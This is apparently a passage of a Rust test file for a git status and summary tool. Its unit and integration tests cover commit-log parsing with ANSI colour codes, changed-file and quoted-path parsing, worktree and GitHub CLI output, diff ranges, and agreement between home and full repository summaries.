    // the connector before the second commit is wrapped in a red SGR pair.
    let log = "* a1b2c3d|||main|||Alice|||2023-01-01 12:00|||First commit\n\u{1b}[31m|\u{1b}[m * e5f6g7h|||feature|||Bob|||2023-01-02 15:30|||Second commit\n";
    let commits = parse_commit_log(log);
    assert_eq!(commits.len(), 2);
    assert_eq!(commits[0].hash, "a1b2c3d");
    assert_eq!(commits[0].graph, "* ");
    assert_eq!(commits[1].hash, "e5f6g7h");
    // The ANSI codes must survive intact in the graph field for the
    // renderer to interpret; the hash itself is unaffected since git never
    // colors the %h placeholder here.
    assert_eq!(commits[1].graph, "\u{1b}[31m|\u{1b}[m * ");
}

#[test]
fn test_parse_changed_files() {
    let name_status = "\
M\tsrc/main.rs
A\tsrc/git.rs
R098\told_name.rs\tnew_name.rs
D\tdeleted.rs
";
    let numstat = "\
10\t5\tsrc/main.rs
100\t0\tsrc/git.rs
20\t20\tnew_name.rs
0\t30\tdeleted.rs
";
    let files = parse_changed_files(name_status, numstat);
    assert_eq!(files.len(), 4);

    assert_eq!(files[0].status, "M");
    assert_eq!(files[0].path, "src/main.rs");
    assert_eq!(files[0].old_path, None);
    assert_eq!(files[0].additions, 10);
    assert_eq!(files[0].deletions, 5);

    assert_eq!(files[1].status, "A");
    assert_eq!(files[1].path, "src/git.rs");
    assert_eq!(files[1].old_path, None);
    assert_eq!(files[1].additions, 100);
    assert_eq!(files[1].deletions, 0);

    assert_eq!(files[2].status, "R");
    assert_eq!(files[2].path, "new_name.rs");
    assert_eq!(files[2].old_path, Some("old_name.rs".to_string()));
    assert_eq!(files[2].additions, 20);
    assert_eq!(files[2].deletions, 20);

    assert_eq!(files[3].status, "D");
    assert_eq!(files[3].path, "deleted.rs");
    assert_eq!(files[3].old_path, None);
    assert_eq!(files[3].additions, 0);
    assert_eq!(files[3].deletions, 30);
}

#[test]
fn test_diff_range() {
    let range1 = diff_range(Some("v1.0.0"), "v2.0.0", false);
    assert_eq!(range1, vec!["v1.0.0..v2.0.0".to_string()]);

    let range2 = diff_range(None, "v2.0.0", false);
    assert_eq!(range2, vec!["v2.0.0^..v2.0.0".to_string()]);

    // merge-base (GitHub compare) form
    let range3 = diff_range(Some("main"), "feature", true);
    assert_eq!(range3, vec!["main...feature".to_string()]);
    // single-commit mode ignores the three-dot flag
    let range4 = diff_range(None, "v2.0.0", true);
    assert_eq!(range4, vec!["v2.0.0^..v2.0.0".to_string()]);
}

#[test]
fn test_find_git_repos() {
    let temp = std::env::temp_dir().join(format!("git_test_scan_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&temp);
    std::fs::create_dir_all(&temp).unwrap();

    let repo_a = temp.join("repo_a");
    let repo_b = temp.join("sub").join("repo_b");
    let not_a_repo = temp.join("not_a_repo");

    std::fs::create_dir_all(repo_a.join(".git")).unwrap();
    std::fs::create_dir_all(repo_b.join(".git")).unwrap();
    std::fs::create_dir_all(&not_a_repo).unwrap();

    let found = find_git_repos(&temp, 3);
    assert_eq!(found.len(), 2);
    assert!(found.contains(&repo_a));
    assert!(found.contains(&repo_b));

    let _ = std::fs::remove_dir_all(&temp);
}

#[test]
fn test_unquote_path() {
    assert_eq!(unquote_path("simple.rs"), "simple.rs");
    assert_eq!(
        unquote_path("\"path with spaces.txt\""),
        "path with spaces.txt"
    );
    assert_eq!(unquote_path("\"foo/\\\"bar\\\".rs\""), "foo/\"bar\".rs");
    assert_eq!(unquote_path("\"line1\\nline2.txt\""), "line1\nline2.txt");
    // Octal escape for Japanese (e.g. "日本語.txt" in octal)
    let octal_encoded = "\"\\346\\227\\245\\346\\234\\254\\350\\252\\236.txt\"";
    assert_eq!(unquote_path(octal_encoded), "日本語.txt");
}

#[test]
fn test_parse_changed_files_with_quotes_and_renames() {
    let name_status = "\
M\t\"path with spaces.txt\"
R100\t\"old name.txt\"\t\"new name.txt\"
A\t\"\\346\\227\\245\\346\\234\\254\\350\\252\\236.txt\"
";
    let numstat = "\
5\t2\t\"path with spaces.txt\"
10\t0\t\"old name.txt\" => \"new name.txt\"
20\t0\t\"\\346\\227\\245\\346\\234\\254\\350\\252\\236.txt\"
";
    let files = parse_changed_files(name_status, numstat);
    assert_eq!(files.len(), 3);

    assert_eq!(files[0].status, "M");
    assert_eq!(files[0].path, "path with spaces.txt");
    assert_eq!(files[0].additions, 5);
    assert_eq!(files[0].deletions, 2);

    assert_eq!(files[1].status, "R");
    assert_eq!(files[1].path, "new name.txt");
    assert_eq!(files[1].old_path, Some("old name.txt".to_string()));
    assert_eq!(files[1].additions, 10);
    assert_eq!(files[1].deletions, 0);

    assert_eq!(files[2].status, "A");
    assert_eq!(files[2].path, "日本語.txt");
    assert_eq!(files[2].additions, 20);
    assert_eq!(files[2].deletions, 0);
}

#[test]
fn test_parse_worktrees() {
    let output = "worktree /path/to/main\nHEAD abcdef1234567890\nbranch refs/heads/main\n\nworktree /path/to/feat\nHEAD 1234567890abcdef\nbranch refs/heads/feat-x\n\nworktree /path/to/bare\nbare\n\nworktree /path/to/detached\nHEAD 9999999999\ndetached\n";
    let wts = parse_worktrees(output);
    assert_eq!(wts.len(), 4);

    assert_eq!(wts[0].path, "/path/to/main");
    assert_eq!(wts[0].head, "abcdef1234567890");
    assert_eq!(wts[0].branch, Some("main".to_string()));
    assert!(!wts[0].is_bare);
    assert!(!wts[0].is_detached);

    assert_eq!(wts[1].path, "/path/to/feat");
    assert_eq!(wts[1].branch, Some("feat-x".to_string()));

    assert_eq!(wts[2].path, "/path/to/bare");
    assert!(wts[2].is_bare);

    assert_eq!(wts[3].path, "/path/to/detached");
    assert!(wts[3].is_detached);
}

#[test]
fn test_parse_gh_prs() {
    let json = r#"[{"number":1},{"number":2},{"number":3}]"#;
    assert_eq!(parse_gh_prs(json), Some(3));

    let empty = r#"[]"#;
    assert_eq!(parse_gh_prs(empty), Some(0));

    let invalid = "invalid json";
    assert_eq!(parse_gh_prs(invalid), None);
}

#[test]
fn test_parse_gh_runs() {
    let json = r#"[{"conclusion":"success","status":"completed","url":"https://github.com/org/repo/actions/runs/123"}]"#;
    let (status, url) = parse_gh_runs(json);
    assert_eq!(status, Some("success".to_string()));
    assert_eq!(
        url,
        Some("https://github.com/org/repo/actions/runs/123".to_string())
    );

    let empty = r#"[]"#;
    let (status, url) = parse_gh_runs(empty);
    assert_eq!(status, None);
    assert_eq!(url, None);
}

/// Helper for the home-summary tests: run git in `dir`, ignoring the exit
/// code (a conflicting `merge` exits non-zero by design).
fn git_in(dir: &Path, args: &[&str]) {
    Command::new("git")
        .args(args)
        .current_dir(dir)
        .output()
        .unwrap();
}

#[test]
fn test_get_home_summary_agrees_with_get_summary() {
    let temp_dir = std::env::temp_dir().join("git_test_home_summary_agrees");
    let _ = fs::remove_dir_all(&temp_dir);
    fs::create_dir_all(&temp_dir).unwrap();

    git_in(&temp_dir, &["init"]);
    git_in(&temp_dir, &["config", "user.name", "Home Tester"]);
    git_in(&temp_dir, &["config", "user.email", "home@example.com"]);
    git_in(&temp_dir, &["config", "commit.gpgsign", "false"]);

    fs::write(temp_dir.join("f.txt"), "base\n").unwrap();
    git_in(&temp_dir, &["add", "."]);
    git_in(&temp_dir, &["commit", "-m", "base"]);

    let base_branch = run_git_cmd(&temp_dir, &["branch", "--show-current"])
        .unwrap()
        .trim()
        .to_string();
    assert!(!base_branch.is_empty());

    // 1. Clean-ish repository with an untracked file and *no upstream*.
    fs::write(temp_dir.join("untracked.txt"), "scratch\n").unwrap();
    let home = get_home_summary(&temp_dir).unwrap();
    let full = get_summary(&temp_dir, &[]).unwrap();
    assert!(!full.has_upstream, "fresh repo must have no upstream");
    assert_eq!(home.current_branch, full.current_branch);
    assert_eq!(home.current_branch, base_branch);
    assert_eq!(home.uncommitted_changes, full.uncommitted_changes);
    assert_eq!(home.uncommitted_changes, 1, "the untracked file counts");
    assert_eq!(home.conflicts, full.conflicts);
    assert_eq!(home.conflicts, 0);
    assert_eq!(home.op_state, full.op_state);
    assert_eq!(home.op_state, GitOpState::None);
    assert_eq!((home.ahead, home.behind), (full.ahead, full.behind));
    assert_eq!((home.ahead, home.behind), (0, 0));

    // 2. A real, unresolved merge conflict on top of that.
    git_in(&temp_dir, &["checkout", "-b", "feature"]);
    fs::write(temp_dir.join("f.txt"), "feature side\n").unwrap();
    git_in(&temp_dir, &["commit", "-am", "feature"]);
    git_in(&temp_dir, &["checkout", &base_branch]);
    fs::write(temp_dir.join("f.txt"), "mainline side\n").unwrap();
    git_in(&temp_dir, &["commit", "-am", "mainline"]);
    git_in(&temp_dir, &["merge", "feature"]);

    let home = get_home_summary(&temp_dir).unwrap();
    let full = get_summary(&temp_dir, &[]).unwrap();
    assert_eq!(home.current_branch, full.current_branch);
    assert_eq!(home.current_branch, base_branch);
    assert_eq!(home.uncommitted_changes, full.uncommitted_changes);
    assert_eq!(home.conflicts, full.conflicts);
    assert_eq!(home.conflicts, 1, "f.txt is unmerged");
    assert_eq!(home.op_state, full.op_state);
    assert_eq!(home.op_state, GitOpState::Merge);
    assert_eq!((home.ahead, home.behind), (full.ahead, full.behind));
    assert!(!full.has_upstream);

    let _ = fs::remove_dir_all(&temp_dir);
}

#[test]
fn test_get_home_summary_missing_path_errors_like_get_summary() {
    let missing = std::env::temp_dir().join("git_test_home_summary_missing");
    let _ = fs::remove_dir_all(&missing);
    assert!(!missing.exists());

    // A moved or deleted repository must surface as an error row, exactly as
    // it does through the full summary.
    assert!(get_home_summary(&missing).is_err());
    assert!(get_summary(&missing, &[]).is_err());
}
